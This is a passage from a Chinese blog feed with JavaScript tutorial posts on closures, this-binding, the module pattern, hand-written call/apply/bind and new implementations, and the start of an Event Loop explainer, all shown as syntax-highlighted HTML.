class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;  <span class="comment">// 仅在这里作出了改动</span></span><br><span class="line">    arr[i] = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> a = <span class="number">0</span>;a &lt; <span class="number">10</span>;a++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(arr[a]());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">test(); <span class="comment">// 打印 0 到 9</span></span><br></pre></td></tr></table></figure><p>对于上面两种代码的解释，请看<a href="https://segmentfault.com/q/1010000006873055" target="_blank" rel="noopener">segmentfault</a>：</p><ul><li>闭包中的 this 对象</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"My Object"</span>,</span><br><span class="line">  </span><br><span class="line">  getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj.getName()());  <span class="comment">// The Window</span></span><br></pre></td></tr></table></figure><p>obj.getName()()实际上是在全局作用域中调用了匿名函数，this指向了window。这里要理解函数名与函数功能（或者称函数值）是分割开的，不要认为函数在哪里，其内部的this就指向哪里。匿名函数的执行环境具有全局性，因此其 this 对象通常指向 window。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"The Window"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"My Object"</span>,</span><br><span class="line">  </span><br><span class="line">  getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> that.name;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj.getName()());  <span class="comment">// My Object</span></span><br></pre></td></tr></table></figure><h3 id="闭包的应用"><a href="#闭包的应用" class="headerlink" title="闭包的应用"></a>闭包的应用</h3><ul><li>应用闭包的主要场合是：设计私有的方法和变量。</li></ul><p>任何在函数中定义的变量，都可以认为是私有变量，因为不能在函数外部访问这些变量。私有变量包括函数的参数、局部变量和函数内定义的其他函数。</p><p>把有权访问私有变量的公有方法称为特权方法（privileged method）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 私有变量</span></span><br><span class="line">  <span class="keyword">var</span> series = <span class="string">"哺乳动物"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Run!!!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 特权方法</span></span><br><span class="line">  <span class="keyword">this</span>.getSeries = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> series;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模块模式（The Module Pattern）：为单例创建私有变量和方法。<br>单例（singleton）：指的是只有一个实例的对象。JavaScript 一般以对象字面量的方式来创建一个单例对象。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> singleton = &#123;</span><br><span class="line">  name: <span class="string">"percy"</span>,</span><br><span class="line">  speak:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"speaking!!!"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是普通模式创建的单例，下面使用模块模式创建单例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> singleton = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 私有变量</span></span><br><span class="line">  <span class="keyword">var</span> age = <span class="number">22</span>;</span><br><span class="line">  <span class="keyword">var</span> speak = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"speaking!!!"</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 特权（或公有）属性和方法</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name: <span class="string">"percy"</span>,</span><br><span class="line">    getAge: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><ul><li>匿名函数最大的用途是创建闭包，并且还可以构建命名空间，以减少全局变量的使用。从而使用闭包模块化代码，减少全局变量的污染。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objEvent = objEvent || &#123;&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">var</span> addEvent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">      <span class="comment">// some code</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeEvent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="comment">// some code</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    objEvent.addEvent = addEvent;</span><br><span class="line">    objEvent.removeEvent = removeEvent;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>在这段代码中函数 addEvent 和 removeEvent 都是局部变量，但我们可以通过全局变量 objEvent 使用它，这就大大减少了全局变量的使用，增强了网页的安全性。</p><ul><li>一个闭包计数器</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> countNumber = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ++num;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h3 id="闭包的缺陷"><a href="#闭包的缺陷" class="headerlink" title="闭包的缺陷"></a>闭包的缺陷</h3><ul><li><p>闭包的缺点就是常驻内存会增大内存使用量，并且使用不当很容易造成内存泄露。</p></li><li><p>如果不是因为某些特殊任务而需要闭包，在没有必要的情况下，在其它函数中创建函数是不明智的，因为闭包对脚本性能具有负面影响，包括处理速度和内存消耗。</p></li></ul><h3 id="最后再来一些有关闭包的面试题"><a href="#最后再来一些有关闭包的面试题" class="headerlink" title="最后再来一些有关闭包的面试题"></a>最后再来一些有关闭包的面试题</h3><ul><li>下面代码中，标记 ？ 的地方输出分别是什么？</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">n,o</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(o);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    fun: <span class="function"><span class="keyword">function</span>(<span class="params">m</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> fun(m,n);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = fun(<span class="number">0</span>);  <span class="comment">// ?</span></span><br><span class="line">a.fun(<span class="number">1</span>);        <span class="comment">// ?        </span></span><br><span class="line">a.fun(<span class="number">2</span>);        <span class="comment">// ?</span></span><br><span class="line">a.fun(<span class="number">3</span>);        <span class="comment">// ?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = fun(<span class="number">0</span>).fun(<span class="number">1</span>).fun(<span class="number">2</span>).fun(<span class="number">3</span>);  <span class="comment">// ?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = fun(<span class="number">0</span>).fun(<span class="number">1</span>);  <span class="comment">// ?</span></span><br><span class="line">c.fun(<span class="number">2</span>);        <span class="comment">// ?</span></span><br><span class="line">c.fun(<span class="number">3</span>);        <span class="comment">// ?</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="literal">undefined</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="literal">undefined</span>, <span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>参考</p><ul><li>《JavaScript 高级程序设计（第三版）》</li><li><a href="https://juejin.im/post/5beee511e51d453b8e543ed6" target="_blank" rel="noopener">深入浅出Javascript闭包</a></li><li><a href="https://segmentfault.com/a/1190000004585904" target="_blank" rel="noopener">【JavaScript】【函数】闭包闭包！</a>  </li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener">学习Javascript闭包（Closure）</a>  </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小二：客官你知道Closure吗？&lt;br&gt;客官：Closure不就是闭包吗&lt;br&gt;小二：你知道它有什么用吗？或者为什么要用它呢？&lt;br&gt;客官：…有话就讲，别吹牛皮&lt;br&gt;小二：（心中万马在奔腾）好吧，今天让我们来讲讲闭包吧&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>call apply bind 的模拟实现</title>
    <link href="https://jiuylq.github.io/2019/05/16/call-apply-bind/"/>
    <id>https://jiuylq.github.io/2019/05/16/call-apply-bind/</id>
    <published>2019-05-16T07:16:18.000Z</published>
    <updated>2019-07-10T13:12:33.233Z</updated>
    
    <content type="html"><![CDATA[<p>call apply bind 的模拟实现，自己记录一下用作笔记<br><a id="more"></a></p><h2 id="call-apply-bind"><a href="#call-apply-bind" class="headerlink" title="call apply bind"></a>call apply bind</h2><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><h3 id="模拟实现call、apply、bind"><a href="#模拟实现call、apply、bind" class="headerlink" title="模拟实现call、apply、bind"></a>模拟实现call、apply、bind</h3><h4 id="call-1"><a href="#call-1" class="headerlink" title="call"></a>call</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/** 如果第一个参数传入的是 null 或者是 undefined, 那么指向this指向 window/global */</span></span><br><span class="line">    <span class="comment">/** 如果第一个参数传入的不是null或者是undefined, 那么必须是一个对象 */</span></span><br><span class="line">    <span class="keyword">if</span> (!context) &#123;</span><br><span class="line">        <span class="comment">//context为null或者是undefined</span></span><br><span class="line">        context = <span class="keyword">typeof</span> <span class="built_in">window</span> === <span class="string">'undefined'</span> ? global : <span class="built_in">window</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    context.fn = <span class="keyword">this</span>; <span class="comment">//this指向的是当前的函数(Function的实例)</span></span><br><span class="line">    <span class="keyword">let</span> rest = [...arguments].slice(<span class="number">1</span>);<span class="comment">//获取除了this指向对象以外的参数, 空数组slice后返回的仍然是空数组</span></span><br><span class="line">    <span class="keyword">let</span> result = context.fn(...rest); <span class="comment">//隐式绑定,当前函数的this指向了context.</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply = <span class="function"><span class="keyword">function</span> (<span class="params">context, rest</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!context) &#123;</span><br><span class="line">        <span class="comment">//context为null或者是undefined时,设置默认值</span></span><br><span class="line">        context = <span class="keyword">typeof</span> <span class="built_in">window</span> === <span class="string">'undefined'</span> ? global : <span class="built_in">window</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    context.fn = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> result;</span><br><span class="line">    <span class="keyword">if</span>(rest === <span class="literal">undefined</span> || rest === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//undefined 或者 是 null 不是 Iterator 对象，不能被 ...</span></span><br><span class="line">        result = context.fn(rest);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> rest === <span class="string">'object'</span>) &#123;</span><br><span class="line">        result = context.fn(...rest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>)&#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"not a function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    Fn.prototype = <span class="keyword">this</span>.prototype;</span><br><span class="line">    <span class="keyword">let</span> bound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> res = [...args, ...arguments]; <span class="comment">//bind传递的参数和函数调用时传递的参数拼接</span></span><br><span class="line">        context = <span class="keyword">this</span> <span class="keyword">instanceof</span> Fn ? <span class="keyword">this</span> : context || <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context, res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//原型链</span></span><br><span class="line">    bound.prototype = <span class="keyword">new</span> Fn();</span><br><span class="line">    <span class="keyword">return</span> bound;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考：</p><ul><li><a href="https://juejin.im/post/5cab0c45f265da2513734390?utm_source=gold_browser_extension#heading-15" target="_blank" rel="noopener">【面试篇】寒冬求职季之你必须要懂的原生JS(上)</a></li><li><a href="https://juejin.im/post/5c9c3989e51d454e3a3902b6#heading-9" target="_blank" rel="noopener">【中高级前端面试】JavaScript手写代码无敌秘籍</a></li><li><a href="https://juejin.im/post/5907eb99570c3500582ca23c" target="_blank" rel="noopener">JavaScript深入之call和apply的模拟实现</a></li><li><a href="https://juejin.im/post/59093b1fa0bb9f006517b906" target="_blank" rel="noopener">JavaScript深入之bind的模拟实现</a></li><li><a href="https://juejin.im/post/5bf6c79bf265da6142738b29#heading-2" target="_blank" rel="noopener">面试官问：能否模拟实现JS的call和apply方法</a></li><li><a href="https://www.zhihu.com/question/35787390" target="_blank" rel="noopener">不能使用call,apply,bind，如何用js实现call或者apply的功能？</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;call apply bind 的模拟实现，自己记录一下用作笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>new 操作符</title>
    <link href="https://jiuylq.github.io/2019/05/16/newOperator/"/>
    <id>https://jiuylq.github.io/2019/05/16/newOperator/</id>
    <published>2019-05-16T07:13:15.000Z</published>
    <updated>2019-07-10T13:13:34.361Z</updated>
    
    <content type="html"><![CDATA[<p>new 操作符的有什么用，如何实现的？<br><a id="more"></a></p><h2 id="new-操作符"><a href="#new-操作符" class="headerlink" title="new 操作符"></a>new 操作符</h2><h3 id="new操作符做了这些事："><a href="#new操作符做了这些事：" class="headerlink" title="new操作符做了这些事："></a>new操作符做了这些事：</h3><ul><li>它创建了一个全新的对象。</li><li>它会被执行[[Prototype]]（也就是<strong>proto</strong>）链接。</li><li>它使this指向新创建的对象。。</li><li>通过new创建的每个对象将最终被[[Prototype]]链接到这个函数的prototype对象上。</li><li>如果函数没有返回对象类型Object(包含Functoin, Array, Date, RegExg, Error)，那么new表达式中的函数调用将返回该对象引用。</li></ul><p>手动实现：</p><p>一、</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">New</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (func.prototype !== <span class="literal">null</span>) &#123;</span><br><span class="line">        res.__proto__ = func.prototype;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> ret = func.apply(res, <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">typeof</span> ret === <span class="string">"object"</span> || <span class="keyword">typeof</span> ret === <span class="string">"function"</span>) &amp;&amp; ret !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = New(A, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// equals to</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> A(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><hr><p>二、</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newOperator</span>(<span class="params">ctor</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> ctor !== <span class="string">'function'</span>)&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">'newOperator function the first param must be a function'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    newOperator.target = ctor;</span><br><span class="line">    <span class="keyword">var</span> newObj = <span class="built_in">Object</span>.create(ctor.prototype);</span><br><span class="line">    <span class="keyword">var</span> argsArr = [].slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">var</span> ctorReturnResult = ctor.apply(newObj, argsArr);</span><br><span class="line">    <span class="keyword">var</span> isObject = <span class="keyword">typeof</span> ctorReturnResult === <span class="string">'object'</span> &amp;&amp; ctorReturnResult !== <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> isFunction = <span class="keyword">typeof</span> ctorReturnResult === <span class="string">'function'</span>;</span><br><span class="line">    <span class="keyword">if</span>(isObject || isFunction)&#123;</span><br><span class="line">        <span class="keyword">return</span> ctorReturnResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考：  </p><ul><li><a href="https://juejin.im/post/5c9c3989e51d454e3a3902b6#heading-0" target="_blank" rel="noopener">【中高级前端面试】JavaScript手写代码无敌秘籍</a>  </li><li><a href="https://juejin.im/post/5bde7c926fb9a049f66b8b52" target="_blank" rel="noopener">【面试官问】能否模拟实现JS的new操作符</a>  </li><li><a href="https://juejin.im/post/5cab0c45f265da2513734390?utm_source=gold_browser_extension" target="_blank" rel="noopener">【面试篇】寒冬求职季之你必须要懂的原生JS(上)</a></li><li><a href="https://github.com/mqyqingfeng/Blog/issues/13" target="_blank" rel="noopener">JavaScript深入之new的模拟实现</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;new 操作符的有什么用，如何实现的？&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Event Loop</title>
    <link href="https://jiuylq.github.io/2019/04/28/Event%20Loop/"/>
    <id>https://jiuylq.github.io/2019/04/28/Event Loop/</id>
    <published>2019-04-27T16:20:38.000Z</published>
    <updated>2019-04-27T16:27:41.589Z</updated>
    
    <content type="html"><![CDATA[<p><code>Event Loop</code>即事件循环，是指浏览器或<code>Node</code>的一种解决<code>javaScript</code>单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h2><h3 id="镇楼题"><a href="#镇楼题" class="headerlink" title="镇楼题"></a>镇楼题</h3><p>自我评测下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'async1 start'</span>);</span><br><span class="line">  <span class="keyword">await</span> async2();</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'async1 end'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'async2'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">async1();</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise1'</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>);</span><br></pre></td></tr></table></figure><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Event Loop</code>即事件循环，是指浏览器或<code>Node</code>的一种解决<code>javaScript</code>单线程运行时不会阻塞的一种机制，也就是我们经常使用异步的原理。</p><h3 id="线程与进程"><a href="#线程与进程" class="headerlink" title="线程与进程"></a>线程与进程</h3><p>1.概念</p><p>我们经常说JS 是单线程执行的，指的是一个进程里只有一个主线程，那到底什么是线程？什么是进程？</p><p>官方语术：  </p><ul><li><code>进程</code>是 